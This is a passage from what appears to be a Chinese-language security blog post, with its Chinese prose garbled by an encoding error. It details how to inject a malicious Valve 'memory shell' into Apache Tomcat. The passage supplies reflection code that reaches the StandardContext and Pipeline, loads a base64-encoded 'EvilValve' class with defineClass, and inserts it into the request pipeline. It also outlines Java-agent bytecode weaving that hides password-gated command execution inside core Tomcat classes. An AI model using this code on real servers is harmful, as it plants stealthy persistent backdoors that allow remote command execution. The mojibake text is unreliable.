class="hljs-keyword">class</span>);<br>defineClassMethod.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-keyword">Class</span> evilValveClass = (<span class="hljs-keyword">Class</span>) defineClassMethod.invoke(webappClassLoader, <span class="hljs-string">&quot;com.evil.EvilValve&quot;</span>, evilValveBytecode, <span class="hljs-number">0</span>, evilValveBytecode.length);<br></code></pre></td></tr></table></figure><ul><li>å®ä¾‹åŒ–æ¶æ„ Valveï¼š</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Valve evilValve <span class="hljs-operator">=</span> (Valve) evilValveClass.newInstance()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>å°†æ¶æ„ Valve æ³¨å…¥ Pipelineï¼š</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">addValveMethod.<span class="hljs-built_in">invoke</span>(pipeline, evilValve);<br></code></pre></td></tr></table></figure><ul><li>æ³¨å…¥ä½ç½®æ§åˆ¶ï¼šTomcat çš„<code>addValve</code>é»˜è®¤åŠ åœ¨æœ«å°¾ã€‚è¦æ’å…¥ç‰¹å®šä½ç½®ï¼ˆå¦‚å¼€å¤´ï¼‰ï¼Œéœ€åå°„è·å–<code>Pipeline</code>çš„<code>valves</code>æ•°ç»„ (<code>StandardPipeline#valves</code>)ï¼Œä½¿ç”¨åå°„ä¿®æ”¹æ•°ç»„æˆ–è°ƒç”¨<code>addValve(Valve, int)</code>(å¦‚æœå­˜åœ¨)ã€‚</li></ul></li></ol></li><li><p>**ä¼˜ç‚¹ï¼š**é€šç”¨æ€§å¼ºï¼Œä¸ä¾èµ– Tomcat API JARã€‚</p></li><li><p><strong>ç¼ºç‚¹ï¼š</strong></p><ul><li>ä»£ç å†—é•¿ï¼Œå¤§é‡åå°„æ“ä½œã€‚</li><li>éœ€è¦å¤„ç†<code>defineClass</code>çš„è°ƒç”¨ï¼ˆ<code>protected</code>æ–¹æ³•ï¼‰ã€‚</li><li>ä¾èµ–å¯¹ Tomcat å†…éƒ¨ç»“æ„ï¼ˆ<code>WebappClassLoader.resources.context</code>ï¼‰çš„å‡†ç¡®äº†è§£ï¼Œä¸åŒ Tomcat ç‰ˆæœ¬å¯èƒ½æœ‰å·®å¼‚ã€‚</li><li>æ³¨å…¥çš„ Valve ç±»ç”±<code>WebappClassLoader</code>åŠ è½½ï¼Œåœ¨å †å†…å­˜ä¸­å¯è§ã€‚</li></ul></li></ul><h3 id="æ–¹å¼äºŒï¼šæ··åˆæ–¹å¼ï¼ˆåˆ©ç”¨-Tomcat-API-åå°„ï¼‰"><a href="#æ–¹å¼äºŒï¼šæ··åˆæ–¹å¼ï¼ˆåˆ©ç”¨-Tomcat-API-åå°„ï¼‰" class="headerlink" title="æ–¹å¼äºŒï¼šæ··åˆæ–¹å¼ï¼ˆåˆ©ç”¨ Tomcat API &amp; åå°„ï¼‰"></a>æ–¹å¼äºŒï¼šæ··åˆæ–¹å¼ï¼ˆåˆ©ç”¨ Tomcat API &amp; åå°„ï¼‰</h3><ul><li><p><strong>åœºæ™¯ï¼š<strong>æ”»å‡»è€…è·å¾—çš„ä»£ç æ‰§è¡Œç¯å¢ƒ</strong>å¯ä»¥è®¿é—®åˆ° Tomcat çš„å†…éƒ¨ API</strong>ï¼ˆä¾‹å¦‚ï¼Œæ”»å‡»ä»£ç æœ¬èº«æ˜¯ç”±<code>WebappClassLoader</code>åŠ è½½çš„ï¼Œæˆ–è€…é€šè¿‡æŸäº›æ–¹å¼å°†<code>catalina.jar</code>åŠ å…¥äº†ç±»è·¯å¾„ï¼‰ã€‚å¸¸è§äºä»å·²å­˜åœ¨çš„ Filter&#x2F;Servlet å‹å†…å­˜é©¬æˆ– JSP Webshell ä¸­è¿›è¡Œâ€œäºŒæ¬¡æ³¨å…¥â€ã€‚</p></li><li><p><strong>æ­¥éª¤ï¼š</strong></p><ol><li><p><strong>è·å–<code>StandardContext</code>(æ›´ç›´æ¥):</strong></p><ul><li>é€šè¿‡<code>ApplicationContext</code>-&gt;<code>ServletContext</code>çš„å±æ€§è·å–ï¼š</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ServletContext servletContext <span class="hljs-operator">=</span> request.getServletContext()<span class="hljs-comment">; // å¦‚æœæœ‰ request å¯¹è±¡</span><br>Field applicationContextField <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>applicationContextField.setAccessible(true)<span class="hljs-comment">;</span><br>Object applicationContext <span class="hljs-operator">=</span> applicationContextField.get(servletContext)<span class="hljs-comment">;</span><br>Field standardContextField <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>standardContextField.setAccessible(true)<span class="hljs-comment">;</span><br>Object standardContext <span class="hljs-operator">=</span> standardContextField.get(applicationContext)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><ul><li>æˆ–è€…é€šè¿‡<code>org.apache.catalina.core.ApplicationDispatcher</code>çš„<code>WRAP_SAME_OBJECT</code>ç‰¹æ€§ï¼ˆå¦‚æœå¯ç”¨ï¼‰è·å–<code>lastServicedRequest</code>&#x2F;<code>lastServicedResponse</code>ä¸­çš„<code>Context</code>(è¾ƒå¤æ‚)ã€‚</li></ul></li><li><p>**è·å–<code>Pipeline</code>å¯¹è±¡ï¼š**åŒæ–¹å¼ä¸€ã€‚</p></li><li><p><strong>æ„é€ æ¶æ„ Valve å®ä¾‹ï¼š</strong></p><ul><li>**æ–¹å¼ A (ClassLoader æ³¨å…¥)ï¼š**åŒæ–¹å¼ä¸€æ­¥éª¤ 5ï¼Œä½¿ç”¨<code>WebappClassLoader.defineClass</code>ã€‚</li><li>**æ–¹å¼ B (ç›´æ¥å®ä¾‹åŒ– - æ›´ä¼˜)ï¼š**å¦‚æœèƒ½ç›´æ¥è®¿é—®åˆ°æ¶æ„ Valve çš„ç±»å®šä¹‰ï¼ˆä¾‹å¦‚ï¼Œæ¶æ„ Valve ç±»å­—èŠ‚ç å·²é€šè¿‡å…¶ä»–æ–¹å¼åŠ è½½ï¼Œæˆ–è€…æ”»å‡»ä»£ç ç›´æ¥åŒ…å«äº†è¿™ä¸ªç±»ï¼‰ï¼Œå¯ä»¥ç›´æ¥<code>new</code>ï¼š</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Valve</span> <span class="hljs-variable">evilValve</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.evil.EvilValve(); <span class="hljs-comment">// éœ€è¦ EvilValve ç±»åœ¨å½“å‰ ClassLoader å¯è§</span><br></code></pre></td></tr></table></figure></li><li><p>**æ³¨å…¥ Valveï¼š**ç›´æ¥è°ƒç”¨<code>StandardPipeline.addValve()</code>æ–¹æ³•ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">((StandardPipeline) pipeline)<span class="hljs-selector-class">.addValve</span>(evilValve);<br></code></pre></td></tr></table></figure><ul><li>åŒæ ·å¯ä»¥é€šè¿‡åå°„æ“ä½œ<code>valves</code>æ•°ç»„æ§åˆ¶æ³¨å…¥ä½ç½®ã€‚</li></ul></li></ol></li><li><p><strong>ä¼˜ç‚¹ï¼š</strong></p><ul><li>ä»£ç ç›¸å¯¹ç®€æ´æ¸…æ™°ï¼ˆå‡å°‘äº†åå°„ï¼‰ã€‚</li><li>æ•ˆç‡æ›´é«˜ã€‚</li></ul></li><li><p><strong>ç¼ºç‚¹ï¼š</strong></p><ul><li>ä¾èµ– Tomcat API ç¯å¢ƒï¼ˆéœ€è¦<code>org.apache.catalina.*</code>ç±»å¯è§ï¼‰ã€‚</li><li>å¦‚æœé‡‡ç”¨æ–¹å¼ B æ„é€ å®ä¾‹ï¼Œéœ€è¦è§£å†³å¦‚ä½•è®©<code>EvilValve</code>ç±»è¢«åŠ è½½çš„é—®é¢˜ï¼ˆå¯èƒ½ä»éœ€<code>defineClass</code>æˆ–ä¾èµ–å…¶ä»–å·²åŠ è½½çš„æ¶æ„ç±»ï¼‰ã€‚</li></ul></li></ul><h3 id="æ–¹å¼ä¸‰ï¼šJava-Agent-ASM-Javassist-å­—èŠ‚ç æ³¨å…¥ï¼ˆç»ˆæéšè”½ï¼‰"><a href="#æ–¹å¼ä¸‰ï¼šJava-Agent-ASM-Javassist-å­—èŠ‚ç æ³¨å…¥ï¼ˆç»ˆæéšè”½ï¼‰" class="headerlink" title="æ–¹å¼ä¸‰ï¼šJava Agent + ASM&#x2F;Javassist å­—èŠ‚ç æ³¨å…¥ï¼ˆç»ˆæéšè”½ï¼‰"></a>æ–¹å¼ä¸‰ï¼šJava Agent + ASM&#x2F;Javassist å­—èŠ‚ç æ³¨å…¥ï¼ˆç»ˆæéšè”½ï¼‰</h3><ul><li><p><strong>åœºæ™¯ï¼š<strong>æ”»å‡»è€…å…·å¤‡æ›´é«˜æƒé™ï¼ˆå¦‚ä¸Šä¼  Agent JAR æˆ–åˆ©ç”¨ Attach API æ³¨å…¥ Agentï¼‰ï¼Œè¿½æ±‚æè‡´çš„éšè”½æ€§ã€‚ç›®æ ‡æ˜¯</strong>ä¸åˆ›å»ºæ–°çš„ Valve ç±»</strong>ï¼Œè€Œæ˜¯å°†æ¶æ„é€»è¾‘<strong>ç›´æ¥ç¼–ç»‡</strong>è¿› Tomcat æ ¸å¿ƒç±»ï¼ˆå¦‚<code>StandardPipeline</code>æˆ–æŸä¸ªå…³é”® Valveï¼‰çš„å­—èŠ‚ç ä¸­ã€‚</p></li><li><p><strong>æ­¥éª¤ï¼š</strong></p><ol><li><p>**æ³¨å…¥ Agentï¼š**é€šè¿‡<code>-javaagent</code>å¯åŠ¨å‚æ•°ã€<code>VirtualMachine.attach()</code>API æˆ–åˆ©ç”¨å·²çŸ¥æ¼æ´åŠ è½½æ¶æ„ Agent Jarã€‚</p></li><li><p>**å®ç°<code>ClassFileTransformer</code>ï¼š**åœ¨ Agent ä¸­æ³¨å†Œè‡ªå®šä¹‰çš„<code>ClassFileTransformer</code>ã€‚</p></li><li><p>**å®šä½å¹¶ä¿®æ”¹ç›®æ ‡ç±»ï¼š**åœ¨<code>transform()</code>æ–¹æ³•ä¸­ï¼Œè¯†åˆ«ç›®æ ‡ç±»ï¼ˆä¾‹å¦‚<code>org.apache.catalina.core.StandardPipeline</code>ï¼‰ï¼š</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;org.apache.catalina.core.StandardPipeline&quot;</span>.<span class="hljs-built_in">equals</span>(className)) &#123;<br>    <span class="hljs-comment">// ä½¿ç”¨ ASM æˆ– Javassist ä¿®æ”¹å­—èŠ‚ç </span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>ä¿®æ”¹<code>addValve</code>æˆ–<code>invoke</code>é€»è¾‘ (ç­–ç•¥)ï¼š</strong></p><ul><li>**ç­–ç•¥ A (åŠ«æŒ<code>invoke</code>):**ä¿®æ”¹<code>StandardPipeline</code>çš„<code>invoke()</code>æ–¹æ³•ã€‚åœ¨æ–¹æ³•å†…éƒ¨éå†<code>valves</code>æ•°ç»„ä¹‹å‰æˆ–æŸä¸ªå…³é”®èŠ‚ç‚¹ï¼ˆå¦‚è°ƒç”¨<code>StandardContextValve.invoke()</code>å‰ï¼‰ï¼Œæ’å…¥æ¶æ„é€»è¾‘ï¼šæ£€æŸ¥è¯·æ±‚ç‰¹å¾ï¼ŒåŒ¹é…åˆ™æ‰§è¡Œå‘½ä»¤ã€æ„é€ å“åº”å¹¶è¿”å›ï¼ˆè·³è¿‡åç»­ Valveï¼‰ã€‚</li><li>**ç­–ç•¥ B (ä¼ªè£…æˆç°æœ‰ Valve):**ä¿®æ”¹æŸä¸ªä¸å¸¸ç”¨æˆ–éå…³é”®çš„ç°æœ‰ Valve ç±»ï¼ˆå¦‚<code>StandardContextValve</code>æˆ–<code>AccessLogValve</code>ï¼‰çš„<code>invoke()</code>æ–¹æ³•ã€‚åœ¨å…¶åŸæœ‰é€»è¾‘çš„å¼€å¤´æˆ–ç»“å°¾æ’å…¥æ¶æ„æ£€æŸ¥é€»è¾‘ã€‚</li><li>**ç­–ç•¥ C (åˆ›å»ºâ€œå¹½çµâ€Valve):**ä¿®æ”¹<code>StandardPipeline</code>çš„<code>addValve()</code>æ–¹æ³•ã€‚ä½¿å…¶åœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼ˆä¾‹å¦‚ï¼Œæ·»åŠ çš„ Valve ç±»ååŒ¹é…æŸä¸ªç‰¹æ®Šæ¨¡å¼æˆ– hashï¼‰ä¸çœŸæ­£æ·»åŠ è¯¥ Valveï¼Œè€Œæ˜¯å°†å…¶ä¿å­˜åˆ°ä¸€ä¸ªéšè—çš„åˆ—è¡¨ä¸­ã€‚åŒæ—¶ä¿®æ”¹<code>invoke()</code>æ–¹æ³•ï¼Œä½¿å…¶åœ¨è°ƒç”¨å®˜æ–¹<code>valves</code>æ•°ç»„å‰åï¼Œä¹Ÿéå†å¹¶è°ƒç”¨è¿™ä¸ªéšè—åˆ—è¡¨ä¸­çš„â€œå¹½çµâ€ Valveã€‚è¿™ç§æ–¹å¼æå…¶éšè”½ï¼Œå› ä¸ºå¸¸è§„çš„<code>Pipeline.valves</code>æ•°ç»„ä¸­çœ‹ä¸åˆ°æ¶æ„ Valveã€‚</li></ul></li><li><p>**å­—èŠ‚ç æ“ä½œï¼š**ä½¿ç”¨ ASM&#x2F;Javassist åº“æ’å…¥æ¶æ„å­—èŠ‚ç ã€‚æ¶æ„é€»è¾‘é€šå¸¸åŒ…å«ï¼š</p><ul><li>ä»<code>Request</code>å¯¹è±¡è·å–å‚æ•°&#x2F;å¤´&#x2F;è·¯å¾„ã€‚</li><li>ä¸é¢„è®¾å¯†ç æ¯”è¾ƒã€‚</li><li>è°ƒç”¨<code>Runtime.exec()</code>æˆ–<code>ProcessBuilder</code>æ‰§è¡Œå‘½ä»¤ã€‚</li><li>è¯»å–æ‰§è¡Œç»“æœï¼Œå†™å…¥<code>Response</code>è¾“å‡ºæµã€‚</li><li>æ ¹æ®æ˜¯å¦åŒ¹é…å¯†ç ï¼Œå†³å®šæ˜¯å¦ç»§ç»­è°ƒç”¨åŸå§‹ç®¡é“é€»è¾‘ (<code>getNext().invoke()</code>ï¼‰ã€‚</li></ul></li></ol></li><li><p><strong>ä¼˜ç‚¹ï¼š</strong></p><ul><li>**ç»ˆæéšè”½æ€§ï¼š**æ²¡æœ‰æ–°çš„å¯ç–‘ç±» (<code>EvilValve</code>) è¢«å®šä¹‰å’ŒåŠ è½½ã€‚æ¶æ„é€»è¾‘â€œæº¶è§£â€åœ¨ Tomcat å®˜æ–¹æ ¸å¿ƒç±»ä¸­ã€‚</li><li>ä¸ä¾èµ–<code>WebappClassLoader</code>ï¼Œåº”ç”¨é‡å¯ååªè¦ Agent ä»åœ¨å°±æœ‰æ•ˆï¼ˆæŒä¹…åŒ–èƒ½åŠ›å¼ºï¼‰ã€‚</li><li>æéš¾é€šè¿‡å¸¸è§„å†…å­˜ dump åˆ†æå‘ç°ï¼ˆéœ€è¦é€ç±»åç¼–è¯‘æ ¡éªŒï¼‰ã€‚</li></ul></li><li><p><strong>ç¼ºç‚¹ï¼š</strong></p><ul><li>å®ç°éš¾åº¦æé«˜ï¼Œéœ€è¦æ·±å…¥ç†è§£ JVM å­—èŠ‚ç å’Œ Tomcat å†…éƒ¨æµç¨‹ã€‚</li><li>éœ€è¦è·å– Agent æ³¨å…¥çš„æƒé™ï¼ˆé€šå¸¸æ„å‘³ç€å·²æœ‰è¾ƒé«˜æƒé™ï¼‰ã€‚</li><li>ä¸åŒ Tomcat ç‰ˆæœ¬çš„æ ¸å¿ƒç±»å­—èŠ‚ç å·®å¼‚è¾ƒå¤§ï¼Œéœ€è¦ä¸ºä¸åŒç‰ˆæœ¬å®šåˆ¶æˆ–åšå…¼å®¹ã€‚</li><li>Agent æœ¬èº«çš„å­˜åœ¨å¯èƒ½è¢«æ£€æµ‹ï¼ˆJVM å‚æ•°ã€<code>VirtualMachine.list()</code>ï¼‰ã€‚</li></ul></li></ul><h2 id="çº¯åå°„æ³¨å…¥"><a href="#çº¯åå°„æ³¨å…¥" class="headerlink" title="çº¯åå°„æ³¨å…¥"></a>çº¯åå°„æ³¨å…¥</h2><h3 id="ä¸€ã€æ ¸å¿ƒåŸç†ä¸ç›®æ ‡"><a href="#ä¸€ã€æ ¸å¿ƒåŸç†ä¸ç›®æ ‡" class="headerlink" title="ä¸€ã€æ ¸å¿ƒåŸç†ä¸ç›®æ ‡"></a><strong>ä¸€ã€æ ¸å¿ƒåŸç†ä¸ç›®æ ‡</strong></h3><ol><li><strong>ç›®æ ‡</strong>ï¼šåœ¨ä¸å¼•å…¥Tomcat APIä¾èµ–ï¼ˆ<code>catalina.jar</code>ç­‰ï¼‰çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡çº¯åå°„æ“ä½œï¼š<ul><li>è·å–å½“å‰Webåº”ç”¨çš„<code>StandardContext</code>ï¼ˆTomcatæ ¸å¿ƒå®¹å™¨å¯¹è±¡ï¼‰</li><li>å®šä½å…¶<code>Pipeline</code>ï¼ˆè¯·æ±‚å¤„ç†ç®¡é“ï¼‰</li><li>åŠ¨æ€æ³¨å…¥æ¶æ„<code>Valve</code>å®ä¾‹åˆ°ç®¡é“ä¸­</li></ul></li><li><strong>æŠ€æœ¯æŒ‘æˆ˜</strong>ï¼š<ul><li>ç»•è¿‡ç±»åŠ è½½å™¨éš”ç¦»ï¼ˆä»éWebç±»åŠ è½½å™¨è®¿é—®Webå±‚å¯¹è±¡ï¼‰</li><li>é€šè¿‡åå°„é“¾ç ´è§£Tomcatå†…éƒ¨æ•°æ®ç»“æ„</li><li>å†…å­˜ä¸­å®šä¹‰æ¶æ„Valveç±»ï¼ˆæ— ç£ç›˜æ–‡ä»¶ï¼‰</li></ul></li></ol><h3 id="äºŒã€æ³¨å…¥æµç¨‹è¯¦è§£"><a href="#äºŒã€æ³¨å…¥æµç¨‹è¯¦è§£" class="headerlink" title="äºŒã€æ³¨å…¥æµç¨‹è¯¦è§£"></a>äºŒã€æ³¨å…¥æµç¨‹è¯¦è§£</h3><h4 id="æ­¥éª¤1ï¼šè·å–WebappClassLoader"><a href="#æ­¥éª¤1ï¼šè·å–WebappClassLoader" class="headerlink" title="æ­¥éª¤1ï¼šè·å–WebappClassLoader"></a><strong>æ­¥éª¤1ï¼šè·å–WebappClassLoader</strong></h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ClassLoader webappClassLoader <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><ul><li><strong>åŸç†</strong>ï¼šTomcatä¸ºæ¯ä¸ªWebåº”ç”¨åˆ›å»ºç‹¬ç«‹çš„<code>WebappClassLoader</code>ï¼Œå½“å‰çº¿ç¨‹çš„ClassLoaderé€šå¸¸å°±æ˜¯å®ƒã€‚</li><li><strong>æ³¨æ„</strong>ï¼šåœ¨éè¯·æ±‚çº¿ç¨‹ï¼ˆå¦‚ååºåˆ—åŒ–è§¦å‘çš„çº¿ç¨‹ï¼‰ä¸­éœ€éå†çº¿ç¨‹ç»„å®šä½ã€‚</li></ul><h4 id="æ­¥éª¤2ï¼šåå°„è·å–StandardContext"><a href="#æ­¥éª¤2ï¼šåå°„è·å–StandardContext" class="headerlink" title="æ­¥éª¤2ï¼šåå°„è·å–StandardContext"></a><strong>æ­¥éª¤2ï¼šåå°„è·å–StandardContext</strong></h4><p>è¿™æ˜¯æœ€æ ¸å¿ƒçš„æ­¥éª¤ï¼Œéœ€ç©¿é€ä¸¤å±‚éšè—å¼•ç”¨ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// <span class="hljs-number">1</span>. è·å–WebappClassLoaderçš„resourceså±æ€§(StandardRoot)<br>Field resourcesField <span class="hljs-operator">=</span> webappClassLoader.getClass().getDeclaredField(<span class="hljs-string">&quot;resources&quot;</span>)<span class="hljs-comment">;</span><br>resourcesField.setAccessible(true)<span class="hljs-comment">;</span><br>Object standardRoot <span class="hljs-operator">=</span> resourcesField.get(webappClassLoader)<span class="hljs-comment">;</span><br><br>// <span class="hljs-number">2</span>. è·å–StandardRootçš„contextå±æ€§(StandardContext)<br>Field contextField <span class="hljs-operator">=</span> standardRoot.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>contextField.setAccessible(true)<span class="hljs-comment">;</span><br>Object standardContext <span class="hljs-operator">=</span> contextField.get(standardRoot)<span class="hljs-comment">; // å¾—åˆ°ç›®æ ‡StandardContext</span><br></code></pre></td></tr></table></figure><ul><li><strong>å…³é”®è·¯å¾„</strong>ï¼š<br><code>WebappClassLoader</code>â†’<code>resources</code>(<code>StandardRoot</code>) â†’<code>context</code>(<code>StandardContext</code>)</li></ul><h4 id="æ­¥éª¤3ï¼šè·å–Pipelineå¯¹è±¡"><a href="#æ­¥éª¤3ï¼šè·å–Pipelineå¯¹è±¡" class="headerlink" title="æ­¥éª¤3ï¼šè·å–Pipelineå¯¹è±¡"></a><strong>æ­¥éª¤3ï¼šè·å–Pipelineå¯¹è±¡</strong></h4><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">Method</span> <span class="hljs-title function_">getPipelineMethod</span> = <span class="hljs-title function_">standardContext</span>.<span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">(&quot;getPipeline&quot;)</span>;<br>Object pipeline = getPipelineMethod.invoke(standardContext)<span class="hljs-punctuation">;</span> <span class="hljs-comment">// StandardPipelineå®ä¾‹</span><br></code></pre></td></tr></table></figure><h4 id="æ­¥éª¤4ï¼šå®šä¹‰æ¶æ„Valveç±»ï¼ˆå†…å­˜åŠ è½½ï¼‰"><a href="#æ­¥éª¤4ï¼šå®šä¹‰æ¶æ„Valveç±»ï¼ˆå†…å­˜åŠ è½½ï¼‰" class="headerlink" title="æ­¥éª¤4ï¼šå®šä¹‰æ¶æ„Valveç±»ï¼ˆå†…å­˜åŠ è½½ï¼‰"></a><strong>æ­¥éª¤4ï¼šå®šä¹‰æ¶æ„Valveç±»ï¼ˆå†…å­˜åŠ è½½ï¼‰</strong></h4><p><strong>æ–¹æ¡ˆAï¼šç¡¬ç¼–ç å­—èŠ‚ç ï¼ˆæ¨èï¼‰</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">// 1. é¢„ç¼–è¯‘EvilValve.classå¹¶è½¬ä¸ºå­—èŠ‚æ•°ç»„</span><br><span class="hljs-type">byte</span>[] evilValveBytecode = Base<span class="hljs-number">64.</span><span class="hljs-built_in">decode</span>(<span class="hljs-string">&quot;yv66vgAAADQAKgoABwAUBwAVCAAWCgAB...&quot;</span>);<br><br><span class="hljs-comment">// 2. åå°„è°ƒç”¨ClassLoader.defineClass</span><br>Method defineClassMethod = ClassLoader.<span class="hljs-keyword">class</span>.<span class="hljs-built_in">getDeclaredMethod</span>(<br>    <span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-type">String</span>.<span class="hljs-keyword">class</span>, <span class="hljs-type">byte</span>[].<span class="hljs-keyword">class</span>, <span class="hljs-type">int</span>.<span class="hljs-keyword">class</span>, <span class="hljs-type">int</span>.<span class="hljs-keyword">class</span>);<br>defineClassMethod.<span class="hljs-built_in">setAccessible</span>(<span class="hljs-literal">true</span>);<br>Class&lt;?&gt; evilValveClass = (Class&lt;?&gt;) defineClassMethod.<span class="hljs-built_in">invoke</span>(<br>    webappClassLoader, <span class="hljs-string">&quot;com.evil.EvilValve&quot;</span>, evilValveBytecode, <span class="hljs-number">0</span>, evilValveBytecode.length);<br></code></pre></td></tr></table></figure><p><strong>æ–¹æ¡ˆBï¼šåŠ¨æ€ç”Ÿæˆå­—èŠ‚ç ï¼ˆASM&#x2F;Javassistï¼‰</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino">ClassWriter cw = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ClassWriter</span>(<span class="hljs-number">0</span>);<br>cw.<span class="hljs-built_in">visit</span>(Opcodes.V1_8, ACC_PUBLIC, <span class="hljs-string">&quot;com/evil/EvilValve&quot;</span>, null, <span class="hljs-string">&quot;java/lang/Object&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;org/apache/catalina/Valve&quot;</span>&#125;);<br><span class="hljs-comment">// ... ç”Ÿæˆinvoke()æ–¹æ³•å­—èŠ‚ç  ...</span><br><span class="hljs-type">byte</span>[] evilValveBytecode = cw.<span class="hljs-built_in">toByteArray</span>();<br><span class="hljs-comment">// åç»­åŒæ–¹æ¡ˆAçš„defineClassè°ƒç”¨</span><br></code></pre></td></tr></table></figure><h4 id="æ­¥éª¤5ï¼šå®ä¾‹åŒ–å¹¶æ³¨å…¥Valve"><a href="#æ­¥éª¤5ï¼šå®ä¾‹åŒ–å¹¶æ³¨å…¥Valve" class="headerlink" title="æ­¥éª¤5ï¼šå®ä¾‹åŒ–å¹¶æ³¨å…¥Valve"></a><strong>æ­¥éª¤5ï¼šå®ä¾‹åŒ–å¹¶æ³¨å…¥Valve</strong></h4><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-comment">// å®ä¾‹åŒ–æ¶æ„Valve</span><br><span class="hljs-keyword">Constructor</span>&lt;?&gt; <span class="hljs-title function_">constructor</span> = <span class="hljs-title function_">evilValveClass</span>.<span class="hljs-title function_">getDeclaredConstructor</span><span class="hljs-params">()</span>;<br><span class="hljs-keyword">constructor</span>.setAccessible(<span class="hljs-keyword">true</span>)<span class="hljs-punctuation">;</span><br>Object evilValve = <span class="hljs-keyword">constructor</span>.newInstance()<span class="hljs-punctuation">;</span><br><br><span class="hljs-comment">// è·å–Pipelineçš„addValveæ–¹æ³•</span><br><span class="hljs-keyword">Method</span> <span class="hljs-title function_">addValveMethod</span> = <span class="hljs-title function_">pipeline</span>.<span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">(&quot;addValve&quot;, Valve.class)</span>;<br>addValveMethod.invoke(pipeline, evilValve)<span class="hljs-punctuation">;</span> <span class="hljs-comment">// æ³¨å…¥åˆ°ç®¡é“æœ«å°¾</span><br></code></pre></td></tr></table></figure><h4 id="æ­¥éª¤6ï¼ˆå¯é€‰ï¼‰ï¼šæ§åˆ¶æ³¨å…¥ä½ç½®"><a href="#æ­¥éª¤6ï¼ˆå¯é€‰ï¼‰ï¼šæ§åˆ¶æ³¨å…¥ä½ç½®" class="headerlink" title="æ­¥éª¤6ï¼ˆå¯é€‰ï¼‰ï¼šæ§åˆ¶æ³¨å…¥ä½ç½®"></a><strong>æ­¥éª¤6ï¼ˆå¯é€‰ï¼‰ï¼šæ§åˆ¶æ³¨å…¥ä½ç½®</strong></h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// è·å–Pipelineçš„valvesæ•°ç»„</span><br>Field valvesField = pipeline.getClass().getDeclaredField(<span class="hljs-string">&quot;valves&quot;</span>);<br>valvesField.setAccessible(<span class="hljs-literal">true</span>);<br>Valve[] valves = (Valve[]) valvesField.get(pipeline);<br><br><span class="hljs-comment">// åˆ›å»ºæ–°æ•°ç»„å¹¶å°†æ¶æ„Valveæ’å…¥ç¬¬äºŒä½ï¼ˆç´§æ¥AccessLogValveåï¼‰</span><br>Valve[] newValves = <span class="hljs-keyword">new</span> Valve[valves.<span class="hljs-built_in">length</span> + <span class="hljs-number">1</span>];<br>System.arraycopy(valves, <span 